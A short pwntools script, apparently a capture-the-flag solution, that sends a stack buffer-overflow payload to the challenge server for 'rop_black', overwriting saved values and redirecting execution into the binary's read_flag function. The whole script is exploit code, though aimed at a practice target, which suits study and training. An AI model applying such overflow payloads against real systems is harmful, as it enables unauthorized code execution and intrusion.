from pwn import *

sh = remote("pwn.battlectf.online",1004)
exe = ELF("./public/rop_black")

payload = b'A'*14
payload += p32(0x804c000)
payload += p32(0x804c800)
payload += p32(exe.sym['read_flag'] + 89)
sh.sendline(payload)

sh.interactive()
